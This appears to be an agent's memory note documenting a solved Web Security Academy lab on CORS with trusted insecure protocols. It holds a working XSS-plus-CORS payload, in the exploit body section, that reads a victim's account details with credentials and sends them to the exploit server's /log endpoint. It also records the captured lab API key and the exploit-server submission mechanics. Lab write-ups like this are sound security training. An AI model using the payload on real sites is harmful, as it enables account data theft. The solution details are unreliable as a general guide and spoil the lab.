---
metadata:
  node_type: memory
name: "CORS Trusted Insecure Protocols Lab Walkthrough"
description: "CORS lab (breaking-https-attack) solved: http://stock. subdomain trusted by ACAO + reflected productId XSS → admin apikey exfil via /log"
last_updated: 2026-10-10T19:44:06+08:00
created: 2026-10-10T19:44:06+08:00
---

## 2026-10-10 CORS vulnerability with trusted insecure protocols (arm A) - SOLVED

Instance: https://0a86007c04a2aa5f80d217ac00c9005f.web-security-academy.net (widget-lab-id C2F3D400E6FB00BEBE61E8DCA6A98B25A66613B18DA83B2279298634C46D7F8E, reused:false)
Exploit server: https://exploit-0aec00ac0413aae4803d163a01b7000a.exploit-server.net

Findings (all via rs pieces, no browser needed):
- GET /accountDetails with Origin: http://stock.<lab-domain> returns access-control-allow-origin reflecting that http origin + access-control-allow-credentials: true (insecure-protocol subdomain trusted).
- http://stock.<lab-domain>/ is a live plain-HTTP subdomain; ?productId=<v>&storeId=1 echoes <v> raw when it is not a valid integer: body `<h4>ERROR</h4>Invalid product ID: <v>` (content-type text/html) = reflected XSS executing under the trusted insecure origin.

Exploit body stored at /exploit on the exploit server, delivered with DELIVER_TO_VICTIM (--follow):
<script>document.location="http://stock.<lab>/?productId=4<script>var req=new XMLHttpRequest();...req.open('get','https://<lab>/accountDetails',true);req.withCredentials=true;...location='https://<exploit>/log?key='%2bthis.responseText;%3c/script>&storeId=1";</script>
Victim (Mozilla/5.0 (Victim) Chrome) hit /log?key={... "apikey": "sYHJVhPgheMTQlvt9uaJAxg4CGknpPXq" ...}; submitted → {"correct":true}; banner verdict solved:true.

Reusable mechanics worth remembering:
- exploit server STORE POST fields: urlIsHttps=on, responseFile=/exploit, responseHead, responseBody, formAction=STORE. responseFile must start with `/` (empty → 400 "File must start with /") and `/` itself → 400 "footgun detected" (use /exploit).
- /submitSolution is served by the EXPLOIT SERVER origin (not the lab host - lab-host POST 404s); body is form-urlencoded `answer=<key>`, JSON body also 404s. Endpoint/method are declared in /resources/labheader/js/submitSolution.js.
- /log on the exploit server is a plain GET and lists victim requests (verify the victim User-Agent line before trusting a hit).
- range_launch takes the 64-hex widget-lab-id, not the lab URL path.

